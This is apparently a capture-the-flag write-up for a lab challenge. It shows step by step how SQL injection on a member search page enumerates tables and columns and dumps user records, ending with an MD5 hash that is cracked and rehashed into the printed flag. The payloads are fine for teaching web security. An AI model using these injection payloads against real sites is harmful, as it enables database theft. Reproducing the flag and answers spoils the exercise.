# <span style="text-decoration: underline"> Member </span>

- Tags : `sql injection` , `md5` , `sha256`
- Server ip : `192.168.1.17`
- Difficulty : <span style="color : red">Difficult</span>

____

# <span style="text-decoration: underline">problem</span>
When we go to the `member page (http://192.168.1.17/?page=member) we see

- A `title` that says **Search member by ID:**
- A text `input`
- A submit button.

It seems like we have to put a value and we will get an answere. Let's try the number **1**. We get the following value

```text
ID: 1 
First name: Barack Hussein
Surname : Obama
```

The website shows us the

- `id` of the **member**
- `first name` of the memver
- `surname` of the member

when we try a different number, such as *5** we get the following value

```text
ID: 5 
First name: Flag
Surname : GetThe
```

?> The minimum number we can use is **1** and the maximum number of value we can try is **5**

It seems like the value we put in the `input` is ised as the `id` for the search (naturally...). The id is meant to be a `number`. it becomes more clear when we try a different text then a `number`, such as the letter `a`, we get the following result.

```text
Unknown column 'a' in 'where clause'
```

And when we try a non alphanumeric value, such as a `#` or a `&` we get the following message

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&' at line 1
```

Here we get a `sql` error message. It seems like that our character is causing an `sql` **syntax error**

# <span style="text-decoration: underline">Solution</span>

## Try to find out basic information

If we had to guess the code that get the **member** data from `sql` database, it might look something like this

```php
$query="SELECT * FROM $table WHERE id=$member_id"
```

So anything we put here goes to the `sql` querry. This means we can even put a valid `sql` query and it will get executed (as long as it is valid). To test this theory we can try the following in value.

```
1 OR 1=1
```

and this should translate to the following query

```sql
SELECT * FROM <table> WHERE id=1 OR 1=1
```

Whats happening here is that `1=1` is always **true** and this is making `sql` give us all the list of **members**. Let's try some more `sql` queries and find out some more information from the database.

|goal|query|Error message|
|--|--|--|
|Verify what happens| `1 OR 1=1 --` | ✅ |

We get the following results

```text
ID: 1 OR 1=1 -- 
First name: Barack Hussein
Surname : Obama

ID: 1 OR 1=1 -- 
First name: Adolf
Surname : Hitler

ID: 1 OR 1=1 -- 
First name: Joseph
Surname : Staline

ID: 1 OR 1=1 -- 
First name: Flag
Surname : GetThe
```

It looks like we have the full list if users. let's collect some more informations

## Get the number of columns

|goal|query|Error message|
|--|--|--|
|Try to see if there is only 1 column we can exploit| `1 UNION SELECT NULL --` | The used SELECT statements have a different number of columns |
|Try to see if there is only 2 column we can exploit| `1 UNION SELECT NULL, NULL --`| ✅ |

> We use the `--` at the end to comment out any other query that comes after ours


An other way of doin this would ne using `ORDER BY` and check for **errors**.

## Get the number of the tables

|goal|query|Error message|
|--|--|--|
|`ORDER BY` column 1| `1 ORDER BY 1 --` | ✅ |
|`ORDER BY` column 2| `1 ORDER BY 2 --` | ✅ |
|`ORDER BY` column 3| `1 ORDER BY 3 --` | ❌ |

We now know that there are **2** columns. Let's dig dipper.

|goal|query|Error message|
|--|--|--|
| Get **table** names | `1 AND 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables` | ✅ |

From this we get a long list of `table` names and `table_schema` names in the following format.

```text
ID: 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables 
First name: <Schema name>
Surname : <Table name>
```

Here is the `schema` and table names that is of interest to us

|No|Schema|Table|
|--|--|--|
|1|Member_Brute_Force|db_default|
|2|Member_Sql_Injection|users|
|3|Member_guestbook|guestbook|
|4|Member_images|list_images|
|5|Member_survey|vote_dbs|

## Get more information from the tables and databases

Let's try to grab one of this tables and see if we can see how many columns there are like we did with the current database (`1 AND 1=0 UNION SELECT null, null --`)

```sql
1 AND 1=0 UNION SELECT null, null FROM guestbook --
```

And we get the following result

```text
Table 'Member_Sql_Injection.guestbook' doesn't exist
```

It seems like our current (default) database is `Member_Sql_Injection`. There is only one `table` under `Member_Sql_Injection` that we can see on our list of `tables` and that is **users**

An other way to know which `database` we are currently using is using the following `query`

```sql
1 AND 1=0 UNION SELECT 1, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) --
```

> The [`DATABASE()`](https://www.w3schools.com/SQL/func_mysql_database.asp) function returns the name of the current database. If there is no current database, this function returns NULL or "".


> The group_concat() function concatenates results into a string. The Information_schema is a database that stores information about other databases. The database() function returns the name of the current database.


## Get columns names

Let's try to find out how many columns does this table has

```sql
1 or 1 UNION select table_name, column_name FROM information_schema.columns --
```

And this also gives us a long list of `table` name and their `columns`. Here are the `tables` that is of our interest and their `column` names.

|No|Table|Column names|
|--|--|--|
|1| **db_default** | `id`, `username`, `password` |
|2| **users** | `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`,  |
|3| **guestbook** | `id_comment` , `comment`, `name` |
|4| **list_images** | `id`, `url`, `title`, `comment` |
|5| **vote_dbs** | `id_vote`, `nb_vote`, `subject`|

?> If you are wondaring how do we know that **this** are the `tables` that interests us, then know that all the other tables ware in all uppercase with generic names that we can always find in **default** configurations. Ofcores this does not mean an importent database can not have those kind of charactaristics.

?> Remember that to acess tables from different database instead of using *only* the name of the table we have to precise teh database and then the name of the table in the following way `database.table_name`. So if we want to access to the table `list_images` from the database `Member_images` we have to use the following syntax `Member_images.list_images`

## Get all the informations from the table

Now that we know tha names of the `columns` for the `tables we can try to access them using the following `sql` query.

```sql
1 AND 1=2 UNION SELECT first_name, CONCAT(CHAR(124), user_id, CHAR(124), first_name, CHAR(124), last_name, CHAR(124), town, CHAR(124), country, CHAR(124), planet, CHAR(124), Commentaire, CHAR(124), countersign, CHAR(124)) AS name FROM users --
```

> Note that here instead of quering two by two all the fields we concatanate **all** tue rows of the specific column into one string separated bu the character `|`.
> - [`CONCAT`](https://docs.microsoft.com/en-us/sql/t-sql/functions/concat-transact-sql?view=sql-server-ver15) : A function used to concatanate whatever you feed it.
> - [`CHAR`](https://docs.microsoft.com/en-us/sql/t-sql/functions/char-transact-sql?view=sql-server-ver15) : A function the character that represents the value you feed it

Here is the result we get

|Id | First name | Last name | Town | Country | Planet | Commentaire | Countersign |
|--|--|--|--|--|--|--|--|
|1|Barack Hussein|Obama|Honolulu |America|EARTH|Amerca !|2b3366bcfd44f540e630d4dc2b9b06d9|
|2|Adolf|Hitler|Berlin|Allemagne|Earth|Ich spreche kein Deutsch.|60e9032c586fb422e2c16dee6286cf10|
|3|Joseph|Staline|Moscou|Russia|Earth|????? ????????????? ?????????|e083b24a01c483437bcf4a9eea7c1b4d|
|5|Flag|GetThe|42|42|42|Decrypt this password -> then lower all the char. Sh256 on it and it's good !|5ff9d0165b4f92b14994e5c685cdce28|

We can see 2 things.

1. There is no id with the nimber **4**
2. The `id` numbeer 5 with the name `flag` contains an interesting **comment** (*Commentaire*) and **Countersign**.

It says
- We need to decryp the password which is `5ff9d0165b4f92b14994e5c685cdce28`
- Then lower all the characters
- And then hash it using Sha256 algorithm and it's good (meaning we will have the flag)

## Unhash and Rehash the result

- So the value `5ff9d0165b4f92b14994e5c685cdce28` is a `md5` hash of the word **`FortyTwo`**.
- When we lower all the characters we get **`fortytwo`**
- When we re hash it using sha245 we get the following checksum `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

> On a mac or linux you can get the sha256 checksum of the word `fortytwo` using the terminal with the following code
>
> ```bash
> echo -n "fortytwo" | sha256sum
> ```
>
> Or you can get it using online tools such as [this](https://md5decrypt.net/Sha256/) (or many others)

?> We can easily "decrypt" (unhash) the value using online tools such as [md5online.org](https://www.md5online.org/md5-decrypt.html) or many others

There you go, we have found the flag.

!> We can use information from this challanage to do the other challenges

# <span style="text-decoration: underline">How to avoid the problem</sapan>

Sql injection could be a dengerouis problem which could as fas as compromise the whole system. in our situation the programmer used the raw **user input** data inside the query which in turn let the user control what the quert string becomes and so the result is given. This kind of situation can be avoided easily by not using the user input directly in our string.

# <span style="text-decoration: underline">Flag</sapan>

```text
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

# <span style="text-decoration: underline">Resources</sapan>

- [How to Concatenate String and NULL Values in SQL Server](https://learnsql.com/cookbook/how-to-concatenate-string-and-null-values-in-sql-server/)
- [SQL CONCATENATE (appending strings to one another)](https://www.sqlbook.com/sql-string-functions/sql-concatenate/)
- [Exploiting SQL Injection: a Hands-on Example](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)
- [SQL Injection | Complete Guide](https://www.youtube.com/watch?v=1nJgupaUPEQ)
- [SQL Injections: The Free 2021 Full Course](https://www.youtube.com/watch?v=fiq59DuhY68)
- [DEFCON 17: Advanced SQL Injection](https://www.youtube.com/watch?v=rdyQoUNeXSg)
